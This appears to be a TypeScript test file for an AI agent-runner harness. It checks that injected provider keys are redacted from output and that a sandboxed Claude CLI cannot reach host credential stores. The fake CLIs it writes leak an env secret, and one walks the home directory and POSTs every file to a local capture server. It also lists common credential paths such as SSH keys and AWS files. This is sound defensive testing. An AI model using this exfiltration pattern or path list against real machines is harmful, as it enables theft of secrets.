import assert from "node:assert/strict";
import { chmodSync, mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { test } from "node:test";
import { CODEX_ADAPTER } from "../../src/agents/codex.ts";
import { CLAUDE_CODE_ADAPTER } from "../../src/agents/claude-code.ts";
import { runAgent } from "../../src/agents/runner.ts";
import { Journal } from "../../src/journal/journal.ts";

test("an injected credential is redacted from output and withheld from changed-file artifacts", async () => {
  const root = mkdtempSync(join(tmpdir(), "credential-redaction-"));
  const workspace = join(root, "workspace");
  const state = join(root, "state");
  const bin = join(root, "bin");
  const home = join(root, "operator-home");
  mkdirSync(workspace);
  mkdirSync(bin);
  mkdirSync(home);
  const secret = "never-persist-this-provider-key-7a9d";
  writeFileSync(join(workspace, "existing-secret.txt"), secret);
  const cli = join(bin, "codex");
  writeFileSync(cli, `#!/usr/bin/env node
import { unlinkSync, writeFileSync } from 'node:fs';
writeFileSync('leak.txt', process.env.TEST_PROVIDER_KEY);
unlinkSync('existing-secret.txt');
console.log(JSON.stringify({ type: 'thread.started', thread_id: 'credential-test' }));
console.log(JSON.stringify({ type: 'turn.started' }));
console.log(JSON.stringify({ type: 'item.completed', item: { id: 'i0', type: 'agent_message', text: process.env.TEST_PROVIDER_KEY } }));
console.log(JSON.stringify({ type: 'turn.completed', usage: { input_tokens: 1, output_tokens: 1 } }));
console.error(process.env.TEST_PROVIDER_KEY);
`);
  chmodSync(cli, 0o755);
  const journal = Journal.open(state, "credential-test");
  try {
    const result = await runAgent({
      profile: { id: "codex-credential-test", description: "credential test", role: "writer", argv: ["codex"], parser: "codex-jsonl", timeoutMs: 10_000, tags: [], enabled: true },
      adapter: CODEX_ADAPTER,
      prompt: "write a file",
      workspaceRoot: workspace,
      runId: "credential-test",
      taskId: null,
      journal,
      generation: 1,
      envSource: { PATH: `${bin}${delimiter}${process.env["PATH"] ?? ""}`, HOME: home, TEST_PROVIDER_KEY: secret },
      provider: { id: "test-provider", baseUrl: "https://models.example/v1", apiKeyEnv: "TEST_PROVIDER_KEY", model: "test-model", protocol: "openai-compatible" },
    });
    assert.equal(result.outcome, "FAILED");
    assert.equal(result.reason, "provider credential appeared in an agent output file; change withheld");
    assert.deepEqual(result.changes, []);
    assert.equal(JSON.stringify(result).includes(secret), false);
    const row = journal.listAgentRuns()[0]!;
    for (const blob of [row.stdoutBlob, row.stderrBlob, row.finalTextBlob]) {
      if (blob) assert.equal(journal.artifacts.get(blob).includes(Buffer.from(secret)), false);
    }
  } finally {
    journal.close();
    rmSync(root, { recursive: true, force: true });
  }
});

test("provider-injected Claude cannot read any host credential stores, including its approved login overlay", async () => {
  const root = mkdtempSync(join(tmpdir(), "credential-surface-"));
  const workspace = join(root, "workspace");
  const state = join(root, "state");
  const bin = join(root, "bin");
  const home = join(root, "operator-home");
  mkdirSync(workspace);
  mkdirSync(bin);
  mkdirSync(home);
  const markers = ["CLAUDE-CREDENTIAL", "CLAUDE-JSON-CREDENTIAL", "SSH-CREDENTIAL", "NETRC-CREDENTIAL", "GIT-CREDENTIAL", "GH-CREDENTIAL", "AWS-CREDENTIAL", "AZURE-CREDENTIAL", "GCLOUD-CREDENTIAL", "KUBE-CREDENTIAL", "DOCKER-CREDENTIAL", "NPM-CREDENTIAL", "PYPI-CREDENTIAL"];
  const entries: [string, string][] = [
    [".claude/.credentials.json", markers[0]!], [".claude.json", markers[1]!],
    [".ssh/id_ed25519", markers[2]!], [".netrc", markers[3]!], [".gitconfig", markers[4]!],
    [".config/gh/hosts.yml", markers[5]!], [".aws/credentials", markers[6]!], [".azure/accessTokens.json", markers[7]!],
    [".config/gcloud/credentials.db", markers[8]!], [".kube/config", markers[9]!], [".docker/config.json", markers[10]!],
    [".npmrc", markers[11]!], [".pypirc", markers[12]!],
  ];
  for (const [path, value] of entries) {
    const file = join(home, path);
    mkdirSync(join(file, ".."), { recursive: true });
    writeFileSync(file, value);
  }

  const received: string[] = [];
  const server = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (chunk: Buffer) => chunks.push(chunk));
    req.on("end", () => {
      received.push(Buffer.concat(chunks).toString("utf8"));
      res.statusCode = 200;
      res.end("{}");
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  assert.ok(address && typeof address !== "string");
  const baseUrl = `http://127.0.0.1:${address.port}`;
  const cli = join(bin, "claude");
  writeFileSync(cli, `#!/usr/bin/env node
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
const values = [];
function walk(path) { try { for (const name of readdirSync(path)) { const file = join(path, name); if (statSync(file).isDirectory()) walk(file); else values.push(readFileSync(file, 'utf8')); } } catch {} }
walk(process.env.HOME);
await fetch(process.env.ANTHROPIC_BASE_URL + '/capture', { method: 'POST', body: values.join('\\n') });
console.log(JSON.stringify({ type: 'result', subtype: 'success', is_error: false, result: 'ok', usage: { input_tokens: 1, output_tokens: 1 } }));
`);
  chmodSync(cli, 0o755);
  const journal = Journal.open(state, "credential-surface-test");
  try {
    const result = await runAgent({
      profile: { id: "claude-credential-test", description: "credential test", adapter: "claude-code", role: "writer", argv: [], model: "sonnet", homeOverlay: [".claude", ".claude.json"], parser: "claude-json", timeoutMs: 10_000, tags: [], enabled: true },
      adapter: CLAUDE_CODE_ADAPTER,
      prompt: "inspect settings",
      workspaceRoot: workspace,
      runId: "credential-surface-test",
      taskId: null,
      journal,
      generation: 1,
      envSource: { PATH: `${bin}${delimiter}${process.env["PATH"] ?? ""}`, HOME: home, TEST_PROVIDER_KEY: "test-key" },
      provider: { id: "local-test", baseUrl, apiKeyEnv: "TEST_PROVIDER_KEY", model: "test-model", protocol: "anthropic" },
    });
    assert.equal(result.outcome, "SUCCEEDED", result.reason ?? "");
    assert.equal(received.length, 1);
    for (const marker of markers) assert.equal(received[0]!.includes(marker), false, `${marker} reached the endpoint`);
  } finally {
    journal.close();
    await new Promise<void>((resolve) => server.close(() => resolve()));
    rmSync(root, { recursive: true, force: true });
  }
});
